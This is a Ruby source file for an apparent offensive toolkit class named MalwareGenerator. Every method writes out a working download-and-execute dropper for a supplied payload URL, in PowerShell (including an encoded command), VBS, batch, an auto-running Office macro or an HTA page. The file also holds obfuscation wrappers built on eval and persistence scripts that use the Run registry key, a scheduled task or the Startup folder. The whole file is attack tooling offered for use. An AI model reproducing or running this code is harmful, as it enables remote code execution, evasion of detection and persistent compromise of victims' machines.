require 'base64'
require 'zlib'
require_relative '../utils/colorize'

class MalwareGenerator
  def self.generate_powershell_dropper(payload_url, output_file = nil)
    dropper = <<~PS1
      $url = "#{payload_url}"
      $temp = $env:TEMP + "\\update.exe"
      (New-Object System.Net.WebClient).DownloadFile($url, $temp)
      Start-Process $temp
    PS1
    
    encoded = Base64.strict_encode64(dropper.encode('UTF-16LE'))
    encoded_dropper = "powershell -EncodedCommand #{encoded}"
    
    output_file ||= "dropper_#{Time.now.to_i}.ps1"
    File.write(output_file, dropper)
    
    puts Colorize.green("PowerShell dropper saved: #{output_file}")
    puts Colorize.yellow("Encoded command: #{encoded_dropper}")
    
    { file: output_file, encoded: encoded_dropper }
  end

  def self.generate_vbs_dropper(payload_url, output_file = nil)
    dropper = <<~VBS
      Set objShell = CreateObject("WScript.Shell")
      Set objHTTP = CreateObject("MSXML2.XMLHTTP")
      objHTTP.Open "GET", "#{payload_url}", False
      objHTTP.Send
      Set objFSO = CreateObject("Scripting.FileSystemObject")
      tempFile = objFSO.GetSpecialFolder(2) & "\\update.exe"
      Set objFile = objFSO.CreateTextFile(tempFile, True)
      objFile.Write objHTTP.ResponseBody
      objFile.Close
      objShell.Run tempFile, 0, False
    VBS
    
    output_file ||= "dropper_#{Time.now.to_i}.vbs"
    File.write(output_file, dropper)
    puts Colorize.green("VBS dropper saved: #{output_file}")
    output_file
  end

  def self.generate_batch_dropper(payload_url, output_file = nil)
    dropper = <<~BAT
      @echo off
      powershell -Command "(New-Object System.Net.WebClient).DownloadFile('#{payload_url}', '%TEMP%\\update.exe')"
      start %TEMP%\\update.exe
    BAT
    
    output_file ||= "dropper_#{Time.now.to_i}.bat"
    File.write(output_file, dropper)
    puts Colorize.green("Batch dropper saved: #{output_file}")
    output_file
  end

  def self.generate_macro_payload(payload_url, output_file = nil)
    macro = <<~VBA
      Sub AutoOpen()
          Dim url As String
          Dim path As String
          url = "#{payload_url}"
          path = Environ("TEMP") & "\\update.exe"
          
          Dim WinHttpReq As Object
          Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
          WinHttpReq.Open "GET", url, False
          WinHttpReq.Send
          
          Dim oStream As Object
          Set oStream = CreateObject("ADODB.Stream")
          oStream.Open
          oStream.Type = 1
          oStream.Write WinHttpReq.ResponseBody
          oStream.SaveToFile path, 2
          oStream.Close
          
          Shell path, vbHide
      End Sub
    VBA
    
    output_file ||= "macro_#{Time.now.to_i}.vba"
    File.write(output_file, macro)
    puts Colorize.green("Macro payload saved: #{output_file}")
    output_file
  end

  def self.generate_hta_payload(payload_url, output_file = nil)
    hta = <<~HTML
      <html>
      <head>
        <title>Update</title>
        <HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Update" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="yes" MINIMIZEBUTTON="yes" SHOWINTASKBAR="yes" SINGLEINSTANCE="no" SYSMENU="yes" VERSION="1.0" WINDOWSTATE="normal" SCROLL="no" SCROLLFLAT="no" INNERBORDER="no" SELECTION="no" CONTEXTMENU="no" />
        <script language="VBScript">
          Sub Window_OnLoad
            Set objShell = CreateObject("WScript.Shell")
            Set objHTTP = CreateObject("MSXML2.XMLHTTP")
            objHTTP.Open "GET", "#{payload_url}", False
            objHTTP.Send
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            tempFile = objFSO.GetSpecialFolder(2) & "\\update.exe"
            Set objFile = objFSO.CreateTextFile(tempFile, True)
            objFile.Write objHTTP.ResponseBody
            objFile.Close
            objShell.Run tempFile, 0, False
            window.close
          End Sub
        </script>
      </head>
      <body>
        <p>Loading...</p>
      </body>
      </html>
    HTML
    
    output_file ||= "payload_#{Time.now.to_i}.hta"
    File.write(output_file, hta)
    puts Colorize.green("HTA payload saved: #{output_file}")
    output_file
  end

  def self.generate_lnk_shortcut(target_path, icon_path = nil, output_file = nil)
    lnk_content = <<~LNK
      [InternetShortcut]
      URL=file:///#{target_path.gsub('\\', '/')}
      IconIndex=0
      IconFile=#{icon_path || 'C:\\Windows\\System32\\shell32.dll'}
    LNK
    
    output_file ||= "shortcut_#{Time.now.to_i}.url"
    File.write(output_file, lnk_content)
    puts Colorize.green("Shortcut file saved: #{output_file}")
    output_file
  end

  def self.generate_obfuscated_payload(original_payload, method = 'base64')
    case method
    when 'base64'
      obfuscated = Base64.strict_encode64(original_payload)
      "eval(base64_decode('#{obfuscated}'))"
    when 'hex'
      obfuscated = original_payload.bytes.map { |b| "\\x#{b.to_s(16).rjust(2, '0')}" }.join
      "eval(\"#{obfuscated}\")"
    when 'rot13'
      obfuscated = original_payload.tr('A-Za-z', 'N-ZA-Mn-za-m')
      obfuscated
    when 'xor'
      key = rand(255)
      obfuscated = original_payload.bytes.map { |b| (b ^ key).chr }.join
      "eval(xor_decode('#{Base64.strict_encode64(obfuscated)}', #{key}))"
    else
      original_payload
    end
  end

  def self.generate_persistence_script(persistence_method = 'registry')
    scripts = {
      'registry' => <<~PS1
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $regName = "Update"
        $regValue = "$env:TEMP\\update.exe"
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
      PS1,
      'scheduled_task' => <<~PS1
        $action = New-ScheduledTaskAction -Execute "$env:TEMP\\update.exe"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger
      PS1,
      'startup_folder' => <<~PS1
        $startup = [Environment]::GetFolderPath("Startup")
        Copy-Item "$env:TEMP\\update.exe" "$startup\\update.exe"
      PS1
    }
    
    script = scripts[persistence_method] || scripts['registry']
    filename = "persistence_#{persistence_method}_#{Time.now.to_i}.ps1"
    File.write(filename, script)
    puts Colorize.green("Persistence script saved: #{filename}")
    filename
  end
end

